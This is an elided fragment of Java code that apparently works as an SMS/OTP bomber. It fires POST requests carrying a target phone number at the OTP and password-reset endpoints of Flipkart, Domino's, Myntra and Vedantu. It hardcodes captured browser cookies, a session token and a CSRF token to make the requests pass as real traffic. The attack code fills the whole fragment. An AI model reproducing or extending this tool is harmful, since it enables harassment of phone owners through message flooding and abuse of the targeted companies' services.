		...
		if (count == 1) {
			try {
				HttpURLConnection con = (HttpURLConnection) new URL(
						"https://rome.api.flipkart.com/api/7/user/otp/generate").openConnection();
			...
			try {
				...
				String jason = "{\"phone_number\": \"" + phone + "\""
						+ ", \"country_code\": \"91\",\"platform\":\"web\"}";
				con.setDoOutput(true);
				try (OutputStream os = con.getOutputStream()) {
					os.write(jason.getBytes());
					os.flush();
			...
			try {
				...
				con.setRequestProperty("X-csrftoken",
						"3Y0rAM9bOxB62qrj7tKJeaV6pBo0W5yePkLjUwWyFSaYwmiT9aFAybz2WW03yUnP");
			...
			try {
				HttpURLConnection con = (HttpURLConnection) new URL(
						"https://api.dominos.co.in/loginhandler/forgotpassword").openConnection();
				con.setRequestMethod("POST");
				con.setRequestProperty("Accept", "application/json, text/plain, */*");
				con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
				con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			...
			try {
				HttpURLConnection con = (HttpURLConnection) new URL("https://www.myntra.com/auth/login/v1/auth/getotp")
						.openConnection();
				con.setRequestMethod("POST");
				con.setRequestProperty("Accept", "*/*");
				con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
				con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
				con.setRequestProperty("content-length", "28");
				con.setRequestProperty("content-type", "application/json");
				con.setRequestProperty("cookie",
						"AKA_A2=A; bm_sz=147ADAB2A45B832D977A967A31327589~YAAQnF06F6BW0u1yAQAAuJWy7ghM0Ga7eSznd2c9sHJ7UEIjyKMHyhEy9o+kVs5x1swhllUxKHXCyt4jIp99l6nAG/+XAuKVwzoXXyRklnH3+wHik67bRZzvot+aNDh1NIEGYIfB6I7yiRqC/nVCGYEOgwFEZ6wjMu3pyOAv5cIQpCnG53NS30lQfkXBa88=; _d_id=96a69630-152a-40a3-afe5-7426cadb32b0; mynt-eupv=1; _pv=default; dp=d; bc=true; utm_track_1=a%3A7%3A%7Bs%3A10%3A%22utm_source%22%3Bs%3A6%3A%22direct%22%3Bs%3A10%3A%22utm_medium%22%3Bs%3A6%3A%22direct%22%3Bs%3A12%3A%22utm_campaign%22%3BN%3Bs%3A11%3A%22campaign_id%22%3BN%3Bs%3A12%3A%22octane_email%22%3BN%3Bs%3A10%3A%22trackstart%22%3Bi%3A1593142582%3Bs%3A8%3A%22trackend%22%3Bi%3A1593747382%3B%7D; lt_timeout=1; lt_session=1; at=; xid=3475208b-b75e-11ea-b0de-000d3af28bfd; microsessid=763; mynt-ulc-api=pincode%3A110054; mynt-loc-src=expiry%3A1593144024139%7Csource%3AIP; _abck=ECF062AA0A10DA3EB09F377784AD94F3~0~~-1~-1~-1; user_session=H31com7dYFmghLp6b9zL6Q.wVXeH78-TI_UX6dytJblZN7P7-wjMbbzf3dJ5YTRG3FPfqJzloM4w-SCr3qmaPnKYWVeUP_oxVHzQlVyKhJjem_L2n4iVb9q3Vl0158LlBM-fswSrAUyUMVX9KgotI0jRFaFXtxb0ionEfn7-jYqcQ.1593142582294.86400000.-KBuhf1-aleGkFf_7dUsa2c4Nnz9u3rxENPJiNgA0mQ; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.21446985.1593142585; _gid=GA1.2.782465090.1593142585; _gat=1; _mxab_=config.bucket%3Dregular%3Bweb.xceleratorTags%3Denabled%3Btest-mobile-signup-newest%3DVariantA%3Bmobileonlylogin.recoverysetupsignup%3Dnotmandatory; utrid=uuid-15931425822980; ak_RT=\"z=1&dm=myntra.com&si=6gedn7mmzuk&ss=kbvnyjn6&sl=1&tt=0&obo=1&rl=1\"; _xsrf=XBI0u85APwFTVK5ArDKa9rW9yIUJJUXm; G_ENABLED_IDPS=google; _gat_UA-1752831-18=1; tvc_VID=1; _gcl_au=1.1.1734733167.1593142591; _fbp=fb.1.1593142590772.2048607773; ak_bmsc=3FCC255C775B8BDF38DB00DF12822B0E173A5D9C7C6C0000346DF55E3CE3B962~; __insp_wid=617845923; __insp_slim=1593142600784; __insp_nv=true; __insp_targlpu=aHR0cHM6Ly93d3cubXludHJhLmNvbS9sb2dpbj9yZWZlcmVyPWh0dHBzOi8vd3d3Lm15bnRyYS5jb20v; __insp_targlpt=TXludHJh; akaas_myntra_SegmentationLabel=1595734600~rv=43~id=67305c668d44ac37d07bb97b69c655dd~rn=PWA; bm_sv=516904EACD2B06B8C23A4960864B6B2E~VuxOjqeeBliQ1spChZJxzA9au6uMUNFeEh9qmZpzMB7o+sGqx1sypULJ6AM71KVg90l1UvkXQTK8rgBg8Yni0A9XsQmIAgsy/lH7uOfwYxrkIiPYlpJTXdzCRW0VgCUEVEQyw9vD7PfFBX8a19g77oyjxwHoJtxOZvP0SJDkUA0=; __insp_norec_sess=true");
				con.setRequestProperty("origin", "https://www.myntra.com");
				con.setRequestProperty("referer", "https://www.myntra.com/login?referer=https://www.myntra.com/");
				con.setRequestProperty("sec-fetch-dest", "empty");
				con.setRequestProperty("sec-fetch-mode", "cors");
				con.setRequestProperty("sec-fetch-site", "same-origin");
				con.setRequestProperty("user-agent",
						"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
				String jason = "{\"phoneNumber\":\"" + phone + "\"}";
				con.setDoOutput(true);
				try (OutputStream os = con.getOutputStream()) {
					os.write(jason.getBytes());
					os.flush();
			...
			try {
				HttpURLConnection con = (HttpURLConnection) new URL(
						"https://user.vedantu.com/user/preLoginVerification").openConnection();
				con.setRequestMethod("POST");
				con.setRequestProperty("Accept", "*/*");
				con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
				con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			...
			try {
				...
				con.setRequestProperty("user-agent",
						"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
				String jason = "application_code=d46dbe487d5baaa0b176cb55d3bc452c&phone=%2B91" + phone
						+ "&countryCode=IN";
				con.setDoOutput(true);
				try (OutputStream os = con.getOutputStream()) {
					os.write(jason.getBytes());
